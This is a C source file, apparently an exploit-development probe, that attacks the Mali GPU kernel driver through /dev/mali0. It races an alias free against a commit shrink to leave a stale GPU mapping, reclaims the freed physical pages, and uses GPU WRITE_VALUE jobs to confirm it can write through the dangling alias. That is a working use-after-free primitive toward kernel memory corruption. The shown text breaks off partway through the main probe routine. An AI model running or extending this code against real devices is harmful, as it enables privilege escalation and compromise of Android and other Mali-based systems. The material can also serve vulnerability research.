/*
 * mali_alias_gpu_access_probe.c -- Test whether a stale alias GPU VA can still
 * write into pages we immediately reclaim after the alias free/shrink TOCTOU race.
 *
 * Safe model:
 *   1. Allocate a native 16-page region and tag source pages 8-15 uniquely.
 *   2. Create a GPU-only alias covering native pages 8-15.
 *   3. Win the proven MEM_FREE(alias) vs MEM_COMMIT(native->8) race.
 *   4. Reserve the old alias VA with a 1-page guard allocation so a later
 *      reclaim candidate cannot reuse the same numeric GPU VA directly.
 *   5. Reclaim the remaining freed pages under a different GPU VA and identify
 *      which original source page each reclaimed page came from.
 *   6. Submit a WRITE_VALUE-ZERO job targeting the matching stale alias page
 *      offset, not just the old base VA.
 *   7. If the tagged reclaim page becomes 0, the stale alias mapping still
 *      reaches reclaimed physical pages independent of numeric GPU-VA reuse.
 *
 * Safety:
 *   - fork + alarm
 *   - no target writes until the reclaimed page shows the canary again
 *   - single WRITE_VALUE job per phase, no chaining
 */

#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_IMPORT  (UK_FUNC_ID + 1)
#define KBASE_FUNC_MEM_COMMIT  (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY   (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS   (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT  (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD      (1U << 0)
#define BASE_MEM_PROT_CPU_WR      (1U << 1)
#define BASE_MEM_PROT_GPU_RD      (1U << 2)
#define BASE_MEM_PROT_GPU_WR      (1U << 3)
#define BASE_MEM_GROW_ON_GPF      (1U << 9)
#define BASE_MEM_COHERENT_LOCAL   (1U << 11)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1

#define BASE_JD_REQ_CS                 (1U << 1)

#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_JD_EVENT_DONE               0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED      0x00004002
#define BASE_JD_EVENT_JOB_INVALID        0x00004003

#define PAGE_BYTES          4096U
#define MAX_RACE_ITERS      25
#define MAX_RECLAIM_ALLOCS  8
#define RECLAIM_PAGES       16U
#define SOURCE_OFFSET_PAGES 8U
#define SOURCE_PAGES        8U
#define GUARD_PAGES         1U
#define SOURCE_ID_NONE      0xFFU
#define CANARY64            0xDEADBEEFCAFEBABEULL
#define SCRATCH64           0xAAAAAAAAAAAAAAAAULL

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
    uint32_t padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

struct base_jd_udata {
    uint64_t blob[2];
};

struct base_dependency {
    uint8_t atom_id;
    uint8_t dependency_type;
};

struct base_jd_atom_v2_old56 {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number;
    uint8_t prio;
    uint8_t device_nr;
    uint8_t padding[5];
    uint8_t extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t addr;
    uint32_t nr_atoms;
    uint32_t stride;
    uint32_t gles_ctx_handle;
    uint32_t padding;
};

struct base_jd_event_v2 {
    uint32_t event_code;
    uint8_t atom_number;
    uint8_t pad[3];
    struct base_jd_udata udata;
};

static int g_fd = -1;
static volatile int g_ready = 0;
static int g_commit_ret = -1;
static uint64_t g_alias_gpu_va = 0;
static uint64_t g_native_gpu_va = 0;

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;
    void *mtp;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;

    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED) {
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    }
    return (mtp == MAP_FAILED) ? -1 : 0;
}

static uint64_t mali_alloc_ext(int fd, uint64_t va_pages, uint64_t commit_pages,
                               uint64_t extent, uint32_t flags)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = va_pages;
    alloc.commit_pages = commit_pages;
    alloc.extent = extent;
    alloc.flags = flags;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static uint64_t mali_alloc_flags(int fd, uint64_t pages, uint32_t flags)
{
    return mali_alloc_ext(fd, pages, pages, pages, flags);
}

static int mali_commit(int fd, uint64_t gpu_va, uint64_t pages)
{
    struct kbase_uk_mem_commit commit;

    memset(&commit, 0, sizeof(commit));
    commit.header.id = KBASE_FUNC_MEM_COMMIT;
    commit.gpu_addr = gpu_va;
    commit.pages = pages;
    mali_ioctl(fd, &commit, sizeof(commit));
    return commit.header.ret;
}

static uint64_t mali_query_commit(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_query query;

    memset(&query, 0, sizeof(query));
    query.header.id = KBASE_FUNC_MEM_QUERY;
    query.gpu_addr = gpu_va;
    query.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    mali_ioctl(fd, &query, sizeof(query));
    return query.value;
}

static uint64_t mali_alias(int fd, uint64_t src_gpu_va, uint64_t offset_pages,
                           uint64_t length_pages)
{
    struct base_mem_aliasing_info info;
    struct kbase_uk_mem_alias alias;

    memset(&info, 0, sizeof(info));
    info.handle = src_gpu_va;
    info.offset = offset_pages;
    info.length = length_pages;

    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = length_pages;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&info;
    if (mali_ioctl(fd, &alias, sizeof(alias)) < 0)
        return 0;
    return alias.header.ret == 0 ? alias.gpu_va : 0;
}

static void mali_free(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free free_req;

    if (!gpu_va)
        return;
    memset(&free_req, 0, sizeof(free_req));
    free_req.header.id = KBASE_FUNC_MEM_FREE;
    free_req.gpu_addr = gpu_va;
    mali_ioctl(fd, &free_req, sizeof(free_req));
}

static void *mali_cpu_map(int fd, uint64_t gpu_va, size_t bytes)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, bytes,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static int ranges_overlap(uint64_t start_a, uint64_t pages_a,
                          uint64_t start_b, uint64_t pages_b)
{
    uint64_t end_a = start_a + pages_a * PAGE_BYTES;
    uint64_t end_b = start_b + pages_b * PAGE_BYTES;

    return !(end_a <= start_b || end_b <= start_a);
}

static const char *event_name(uint32_t code)
{
    switch (code) {
    case BASE_JD_EVENT_DONE: return "DONE";
    case BASE_JD_EVENT_DATA_INVALID_FAULT: return "DATA_INVALID_FAULT";
    case BASE_JD_EVENT_JOB_CANCELLED: return "JOB_CANCELLED";
    case BASE_JD_EVENT_JOB_INVALID: return "JOB_INVALID";
    default: return "UNKNOWN";
    }
}

static int read_event(int fd, struct base_jd_event_v2 *ev)
{
    struct pollfd pfd = { fd, POLLIN | POLLERR | POLLHUP, 0 };
    if (poll(&pfd, 1, 3000) <= 0)
        return -1;
    return read(fd, ev, sizeof(*ev)) == (ssize_t)sizeof(*ev) ? 0 : -1;
}

static void fill_atom(struct base_jd_atom_v2_old56 *atom, uint64_t jc, uint8_t atom_number)
{
    memset(atom, 0, sizeof(*atom));
    atom->jc = jc;
    atom->core_req = BASE_JD_REQ_CS;
    atom->atom_number = atom_number;
    atom->udata.blob[0] = 0xABCD000000000000ULL | atom_number;
}

static void build_wv_desc(uint32_t *jc_cpu, uint64_t target_gpu_va)
{
    memset(jc_cpu, 0, 56);
    jc_cpu[4] = 0x00010005;
    jc_cpu[8] = (uint32_t)target_gpu_va;
    jc_cpu[9] = (uint32_t)(target_gpu_va >> 32);
    jc_cpu[10] = MALI_WRITE_VALUE_TYPE_ZERO;
    __builtin___clear_cache((char *)jc_cpu, (char *)jc_cpu + PAGE_BYTES);
    __sync_synchronize();
}

static int submit_write_value(int fd, uint32_t *jc_cpu, uint64_t jc_gpu_va,
                              uint64_t target_gpu_va, uint8_t atom_number,
                              uint32_t *event_code_out)
{
    struct base_jd_atom_v2_old56 atom;
    struct kbase_uk_job_submit_trace submit;
    struct base_jd_event_v2 ev;

    build_wv_desc(jc_cpu, target_gpu_va);
    fill_atom(&atom, jc_gpu_va, atom_number);

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(atom);
    if (mali_ioctl(fd, &submit, sizeof(submit)) < 0 || submit.header.ret != 0)
        return -1;
    if (read_event(fd, &ev) < 0)
        return -1;
    if (event_code_out)
        *event_code_out = ev.event_code;
    return 0;
}

static uint64_t source_tag(uint8_t source_id)
{
    return CANARY64 ^ ((uint64_t)(source_id + 1U) << 56);
}

static int source_tag_to_id(uint64_t value)
{
    uint8_t source_id;

    for (source_id = 0; source_id < SOURCE_PAGES; source_id++) {
        if (value == source_tag(source_id))
            return (int)source_id;
    }
    return -1;
}

static void fill_source_tags(uint8_t *cpu_base, size_t start_page, size_t page_count)
{
    size_t page;
    size_t word;
    size_t words_per_page = PAGE_BYTES / sizeof(uint64_t);

    for (page = 0; page < page_count; page++) {
        uint64_t value = source_tag((uint8_t)page);
        uint64_t *page_cpu = (uint64_t *)(cpu_base + (start_page + page) * PAGE_BYTES);

        for (word = 0; word < words_per_page; word++)
            page_cpu[word] = value;
    }
}

static int snapshot_source_pages(const uint64_t *cpu_base, size_t pages, uint8_t *source_ids)
{
    size_t i;
    size_t page_stride = PAGE_BYTES / sizeof(uint64_t);
    int count = 0;

    memset(source_ids, SOURCE_ID_NONE, pages);
    for (i = 0; i < pages; i++) {
        int source_id = source_tag_to_id(cpu_base[i * page_stride]);

        if (source_id >= 0) {
            source_ids[i] = (uint8_t)source_id;
            count++;
        }
    }
    return count;
}

static void restore_source_pages(uint64_t *cpu_base, size_t pages, const uint8_t *source_ids)
{
    size_t i;
    size_t page_stride = PAGE_BYTES / sizeof(uint64_t);

    for (i = 0; i < pages; i++) {
        if (source_ids[i] != SOURCE_ID_NONE)
            cpu_base[i * page_stride] = source_tag(source_ids[i]);
    }
}

static int select_source_page(const uint8_t *source_ids, size_t pages,
                              uint8_t *source_id_out, size_t *page_index_out)
{
    size_t i;

    for (i = 0; i < pages; i++) {
        if (source_ids[i] != SOURCE_ID_NONE) {
            *source_id_out = source_ids[i];
            *page_index_out = i;
            return 1;
        }
    }
    return 0;
}

static int find_zeroed_source_page(const uint64_t *cpu_base, size_t pages,
                                   const uint8_t *source_ids,
                                   uint8_t *source_id_out,
                                   size_t *page_index_out)
{
    size_t i;
    size_t page_stride = PAGE_BYTES / sizeof(uint64_t);

    for (i = 0; i < pages; i++) {
        if (source_ids[i] != SOURCE_ID_NONE && cpu_base[i * page_stride] == 0) {
            *source_id_out = source_ids[i];
            *page_index_out = i;
            return 1;
        }
    }
    return 0;
}

static int verify_prereqs(int fd)
{
    uint64_t native_va;
    uint64_t alias_va;
    int shrink_with_alias;
    int shrink_without_alias;
    uint64_t commit_now;

    native_va = mali_alloc_flags(fd, 16, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                     BASE_MEM_GROW_ON_GPF);
    if (!native_va)
        return -1;

    alias_va = mali_alias(fd, native_va, 8, 8);
    if (!alias_va) {
        mali_free(fd, native_va);
        return -1;
    }

    shrink_with_alias = mali_commit(fd, native_va, 8);
    mali_free(fd, alias_va);
    shrink_without_alias = mali_commit(fd, native_va, 8);
    commit_now = mali_query_commit(fd, native_va);
    mali_free(fd, native_va);

    if (shrink_with_alias == 0 || shrink_without_alias != 0 || commit_now != 8)
        return -1;
    return 0;
}

static void *thread_free(void *arg)
{
    (void)arg;
    while (!g_ready) {
    }
    mali_free(g_fd, g_alias_gpu_va);
    return NULL;
}

static void *thread_commit(void *arg)
{
    (void)arg;
    while (!g_ready) {
    }
    g_commit_ret = mali_commit(g_fd, g_native_gpu_va, 8);
    return NULL;
}

static int reserve_alias_guard(int fd, uint64_t alias_va,
                               uint64_t *guard_va_out, uint64_t **guard_cpu_out,
                               int *guard_source_id_out)
{
    uint64_t guard_va;
    uint64_t *guard_cpu;
    int source_id;

    guard_va = mali_alloc_flags(fd, GUARD_PAGES,
                                BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                BASE_MEM_GROW_ON_GPF);
    if (!guard_va)
        return -1;

    guard_cpu = mali_cpu_map(fd, guard_va, GUARD_PAGES * PAGE_BYTES);
    if (guard_cpu == MAP_FAILED) {
        mali_free(fd, guard_va);
        return -1;
    }

    if (guard_va != alias_va) {
        printf("[*] alias guard landed at gpu_va=0x%llx instead of stale alias 0x%llx\n",
               (unsigned long long)guard_va, (unsigned long long)alias_va);
        munmap(guard_cpu, GUARD_PAGES * PAGE_BYTES);
        mali_free(fd, guard_va);
        return 0;
    }

    source_id = source_tag_to_id(guard_cpu[0]);
    if (source_id >= 0) {
        printf("[+] alias guard pinned stale alias VA 0x%llx and reclaimed source page %d\n",
               (unsigned long long)guard_va, source_id);
    } else {
        printf("[+] alias guard pinned stale alias VA 0x%llx (no tagged page in guard)\n",
               (unsigned long long)guard_va);
    }

    *guard_va_out = guard_va;
    *guard_cpu_out = guard_cpu;
    *guard_source_id_out = source_id;
    return 1;
}

static int reserve_alias_window(int fd, uint64_t alias_va,
                                uint64_t *guard_va_out, uint64_t *guard_pages_out,
                                uint64_t **guard_cpu_out, int *guard_source_id_out)
{
    uint64_t window_va;
    uint64_t window_commit;
    int rc;

    window_va = mali_alloc_ext(fd, SOURCE_PAGES, 0, SOURCE_PAGES,
                               BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                               BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                               BASE_MEM_GROW_ON_GPF);
    if (window_va) {
        window_commit = mali_query_commit(fd, window_va);
        if (window_va == alias_va && window_commit == 0) {
            printf("[+] reserved full stale alias window at 0x%llx with commit=0\n",
                   (unsigned long long)window_va);
            *guard_va_out = window_va;
            *guard_pages_out = SOURCE_PAGES;
            *guard_cpu_out = MAP_FAILED;
            *guard_source_id_out = -1;
            return 1;
        }

        printf("[*] zero-commit reserve attempt landed at 0x%llx commit=%llu instead of stale window 0x%llx\n",
               (unsigned long long)window_va,
               (unsigned long long)window_commit,
               (unsigned long long)alias_va);
        mali_free(fd, window_va);
    }

    rc = reserve_alias_guard(fd, alias_va, guard_va_out, guard_cpu_out, guard_source_id_out);
    if (rc <= 0)
        return rc;
    *guard_pages_out = GUARD_PAGES;
    return 1;
}

static int find_reclaim_candidate(int fd, uint64_t *gpu_va_out, uint64_t **cpu_out,
                                  uint8_t *source_ids_out, int *source_page_count_out)
{
    int i;

    for (i = 0; i < MAX_RECLAIM_ALLOCS; i++) {
        uint64_t gpu_va = mali_alloc_flags(fd, RECLAIM_PAGES,
                                           BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                           BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                           BASE_MEM_GROW_ON_GPF);
        uint64_t *cpu;
        int source_pages;

        if (!gpu_va)
            return -1;
        cpu = mali_cpu_map(fd, gpu_va, RECLAIM_PAGES * PAGE_BYTES);
        if (cpu == MAP_FAILED) {
            mali_free(fd, gpu_va);
            return -1;
        }

        source_pages = snapshot_source_pages(cpu, RECLAIM_PAGES, source_ids_out);
        if (source_pages > 0 &&
            !ranges_overlap(gpu_va, RECLAIM_PAGES, g_alias_gpu_va, SOURCE_PAGES)) {
            *gpu_va_out = gpu_va;
            *cpu_out = cpu;
            *source_page_count_out = source_pages;
            printf("[+] Reclaim candidate %d reused %d tagged source pages at gpu_va=0x%llx\n",
                   i + 1, source_pages, (unsigned long long)gpu_va);
            return 1;
        }

        if (source_pages > 0 &&
            ranges_overlap(gpu_va, RECLAIM_PAGES, g_alias_gpu_va, SOURCE_PAGES)) {
            printf("[*] Reclaim candidate %d overlapped stale alias window [0x%llx, 0x%llx); skipping overlap confound\n",
                   i + 1, (unsigned long long)g_alias_gpu_va,
                   (unsigned long long)(g_alias_gpu_va + SOURCE_PAGES * PAGE_BYTES));
        }

        munmap(cpu, RECLAIM_PAGES * PAGE_BYTES);
        mali_free(fd, gpu_va);
    }

    return 0;
}

static int run_gpu_access_attempt(int fd, int iter)
{
    uint64_t native_va = 0, alias_va = 0, reclaim_va = 0, scratch_va = 0, jc_va = 0;
    uint64_t guard_va = 0;
    uint64_t guard_pages = 0;
    uint8_t *native_cpu = MAP_FAILED;
    uint64_t *guard_cpu = MAP_FAILED;
    uint64_t *reclaim_cpu = MAP_FAILED;
    uint64_t *scratch_cpu = MAP_FAILED;
    uint32_t *jc_cpu = MAP_FAILED;
    uint32_t control_event = 0, reclaim_direct_event = 0;
    uint32_t native_tail_event = 0, stale_event = 0;
    uint8_t reclaim_source_ids[RECLAIM_PAGES];
    uint8_t test_source_id = SOURCE_ID_NONE;
    uint8_t zeroed_source_id = SOURCE_ID_NONE;
    size_t reclaim_page_index = 0;
    size_t zeroed_page_index = 0;
    int reclaim_source_count = 0;
    int guard_source_id = -1;
    int rc = 0;

    native_va = mali_alloc_flags(fd, 16, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                     BASE_MEM_GROW_ON_GPF);
    if (!native_va) {
        printf("[-] iter %d: native alloc failed\n", iter);
        return -1;
    }

    native_cpu = mali_cpu_map(fd, native_va, 16 * PAGE_BYTES);
    if (native_cpu == MAP_FAILED) {
        printf("[-] iter %d: native mmap failed errno=%d\n", iter, errno);
        rc = -1;
        goto cleanup;
    }
    fill_source_tags(native_cpu, SOURCE_OFFSET_PAGES, SOURCE_PAGES);

    alias_va = mali_alias(fd, native_va, 8, 8);
    if (!alias_va) {
        printf("[-] iter %d: alias failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    g_fd = fd;
    g_native_gpu_va = native_va;
    g_alias_gpu_va = alias_va;
    g_commit_ret = -1;
    g_ready = 0;

    {
        pthread_t t_free, t_commit;

        pthread_create(&t_free, NULL, thread_free, NULL);
        pthread_create(&t_commit, NULL, thread_commit, NULL);
        usleep(iter % 7);
        g_ready = 1;
        pthread_join(t_free, NULL);
        pthread_join(t_commit, NULL);
    }
    alias_va = 0;

    if (g_commit_ret != 0) {
        printf("[*] iter %d: race did not win (commit ret=%d)\n", iter, g_commit_ret);
        rc = 0;
        goto cleanup;
    }

    printf("[!!!] iter %d: race won (commit_now=%llu)\n",
           iter, (unsigned long long)mali_query_commit(fd, native_va));

    rc = reserve_alias_window(fd, g_alias_gpu_va, &guard_va, &guard_pages,
                              &guard_cpu, &guard_source_id);
    if (rc <= 0) {
        printf("[*] iter %d: could not reserve the stale alias window cleanly (%d)\n",
               iter, rc);
        rc = (rc < 0) ? -1 : 0;
        goto cleanup;
    }

    rc = find_reclaim_candidate(fd, &reclaim_va, &reclaim_cpu,
                                reclaim_source_ids, &reclaim_source_count);
    if (rc <= 0) {
        printf("[*] iter %d: no reclaim candidate with tagged pages outside the stale alias window (%d)\n",
               iter, rc);
        rc = 0;
        goto cleanup;
    }
    rc = 0;

    if (!select_source_page(reclaim_source_ids, RECLAIM_PAGES,
                            &test_source_id, &reclaim_page_index)) {
        printf("[-] iter %d: reclaim candidate had no selectable tagged page\n", iter);
        rc = -1;
        goto cleanup;
    }
    printf("[*] iter %d: selected reclaim page=%zu source_page=%u guard_source=%d\n",
           iter, reclaim_page_index, test_source_id, guard_source_id);

    scratch_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                      BASE_MEM_COHERENT_LOCAL);
    jc_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_COHERENT_LOCAL);
    if (!scratch_va || !jc_va) {
        printf("[-] iter %d: scratch/jc alloc failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    scratch_cpu = mali_cpu_map(fd, scratch_va, PAGE_BYTES);
    jc_cpu = mali_cpu_map(fd, jc_va, PAGE_BYTES);
    if (scratch_cpu == MAP_FAILED || jc_cpu == MAP_FAILED) {
        printf("[-] iter %d: scratch/jc mmap failed errno=%d\n", iter, errno);
        rc = -1;
        goto cleanup;
    }

    scratch_cpu[0] = SCRATCH64;
    if (submit_write_value(fd, jc_cpu, jc_va, scratch_va, 0x70, &control_event) < 0) {
        printf("[-] iter %d: control submit failed\n", iter);
        rc = -1;
        goto cleanup;
    }
    printf("[*] iter %d: control event=%s scratch=0x%016llx\n",
           iter, event_name(control_event), (unsigned long long)scratch_cpu[0]);
    if (control_event != BASE_JD_EVENT_DONE || scratch_cpu[0] != 0) {
        printf("[-] iter %d: control WRITE_VALUE failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    restore_source_pages(reclaim_cpu, RECLAIM_PAGES, reclaim_source_ids);
    if (submit_write_value(fd, jc_cpu, jc_va,
                           reclaim_va + reclaim_page_index * PAGE_BYTES, 0x71,
                           &reclaim_direct_event) < 0) {
        printf("[-] iter %d: reclaim direct submit failed\n", iter);
        rc = -1;
        goto cleanup;
    }
    if (!find_zeroed_source_page(reclaim_cpu, RECLAIM_PAGES, reclaim_source_ids,
                                 &zeroed_source_id, &zeroed_page_index)) {
        printf("[-] iter %d: reclaim direct write did not zero the selected tagged page\n", iter);
        rc = -1;
        goto cleanup;
    }
    printf("[*] iter %d: reclaim direct target=0x%llx source_page=%u event=%s zeroed_page=%zu\n",
           iter, (unsigned long long)(reclaim_va + reclaim_page_index * PAGE_BYTES),
           test_source_id, event_name(reclaim_direct_event), zeroed_page_index);
    if (reclaim_direct_event != BASE_JD_EVENT_DONE ||
        zeroed_source_id != test_source_id ||
        zeroed_page_index != reclaim_page_index) {
        printf("[-] iter %d: reclaim direct control mismatched source/page mapping\n", iter);
        rc = -1;
        goto cleanup;
    }

    restore_source_pages(reclaim_cpu, RECLAIM_PAGES, reclaim_source_ids);
    if (submit_write_value(fd, jc_cpu, jc_va,
                           native_va + (SOURCE_OFFSET_PAGES + (uint64_t)test_source_id) * PAGE_BYTES,
                           0x72,
                           &native_tail_event) < 0) {
        printf("[-] iter %d: stale native-tail submit failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    if (find_zeroed_source_page(reclaim_cpu, RECLAIM_PAGES, reclaim_source_ids,
                                &zeroed_source_id, &zeroed_page_index)) {
        printf("[*] iter %d: stale native tail target=0x%llx event=%s zeroed_source=%u reclaim_page=%zu\n",
               iter,
               (unsigned long long)(native_va + (SOURCE_OFFSET_PAGES + (uint64_t)test_source_id) * PAGE_BYTES),
               event_name(native_tail_event), zeroed_source_id, zeroed_page_index);
    } else {
        printf("[*] iter %d: stale native tail target=0x%llx event=%s zeroed=no\n",
               iter,
               (unsigned long long)(native_va + (SOURCE_OFFSET_PAGES + (uint64_t)test_source_id) * PAGE_BYTES),
               event_name(native_tail_event));
    }

    if (native_tail_event == BASE_JD_EVENT_DONE &&
        find_zeroed_source_page(reclaim_cpu, RECLAIM_PAGES, reclaim_source_ids,
                                &zeroed_source_id, &zeroed_page_index)) {
        printf("[!!!] STALE NATIVE-TAIL GPU ACCESS CONFIRMED\n");
        printf("      native tail GPU VA 0x%llx zeroed source page %u now at reclaim page %zu\n",
               (unsigned long long)(native_va + (SOURCE_OFFSET_PAGES + (uint64_t)test_source_id) * PAGE_BYTES),
               zeroed_source_id, zeroed_page_index);
        rc = 1;
    }

    restore_source_pages(reclaim_cpu, RECLAIM_PAGES, reclaim_source_ids);
    if (submit_write_value(fd, jc_cpu, jc_va,
                           g_alias_gpu_va + (uint64_t)test_source_id * PAGE_BYTES,
                           0x73, &stale_event) < 0) {
        printf("[-] iter %d: stale alias submit failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    if (find_zeroed_source_page(reclaim_cpu, RECLAIM_PAGES, reclaim_source_ids,
                                &zeroed_source_id, &zeroed_page_index)) {
        printf("[*] iter %d: stale alias target=0x%llx source_page=%u event=%s zeroed_source=%u reclaim_page=%zu\n",
               iter,
               (unsigned long long)(g_alias_gpu_va + (uint64_t)test_source_id * PAGE_BYTES),
               test_source_id, event_name(stale_event),
               zeroed_source_id, zeroed_page_index);
    } else {
        printf("[*] iter %d: stale alias target=0x%llx source_page=%u event=%s zeroed=no\n",
               iter,
               (unsigned long long)(g_alias_gpu_va + (uint64_t)test_source_id * PAGE_BYTES),
               test_source_id, event_name(stale_event));
    }

    if (stale_event == BASE_JD_EVENT_DONE &&
        find_zeroed_source_page(reclaim_cpu, RECLAIM_PAGES, reclaim_source_ids,
                                &zeroed_source_id, &zeroed_page_index)) {
        if (zeroed_source_id == test_source_id) {
            printf("[!!!] STALE ALIAS GPU ACCESS CONFIRMED\n");
            printf("      stale alias page %u zeroed reclaim page %zu through the old alias VA window\n",
                   test_source_id, zeroed_page_index);
            rc = 1;
        } else {
            printf("[*] iter %d: stale alias zeroed source page %u instead of requested page %u\n",
                   iter, zeroed_source_id, test_source_id);
        }
    }

    if (rc == 0)
        printf("[*] iter %d: no stale mapping write signal yet\n", iter);

cleanup:
    if (jc_cpu != MAP_FAILED)
        munmap(jc_cpu, PAGE_BYTES);
    if (scratch_cpu != MAP_FAILED)
        munmap(scratch_cpu, PAGE_BYTES);
    if (guard_cpu != MAP_FAILED)
        munmap(guard_cpu, guard_pages * PAGE_BYTES);
    if (reclaim_cpu != MAP_FAILED)
        munmap(reclaim_cpu, RECLAIM_PAGES * PAGE_BYTES);
    if (native_cpu != MAP_FAILED)
        munmap(native_cpu, 16 * PAGE_BYTES);
    if (jc_va)
        mali_free(fd, jc_va);
    if (scratch_va)
        mali_free(fd, scratch_va);
    if (guard_va)
        mali_free(fd, guard_va);
    if (reclaim_va)
        mali_free(fd, reclaim_va);
    if (alias_va)
        mali_free(fd, alias_va);
    if (native_va)
        mali_free(fd, native_va);
    return rc;
}

static void run_probe(void)
{
    int i;

    printf("=== mali_alias_gpu_access_probe ===\n");
    printf("Winning alias free/shrink, reclaiming the freed pages, then testing\n");
    printf("whether a WRITE_VALUE to the stale alias GPU VA reaches the reclaimed page.\n\n");

    g_fd = open("/dev/mali0", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (g_fd < 0) {
        perror("open /dev/mali0");
        return;
    }
    if (mali_init(g_fd) < 0) {
        perror("mali_init");
        close(g_fd);
        return;
    }

    if (verify_prereqs(g_fd) < 0) {
        printf("[-] alias/free/shrink preflight failed\n");
        close(g_fd);
        return;
    }

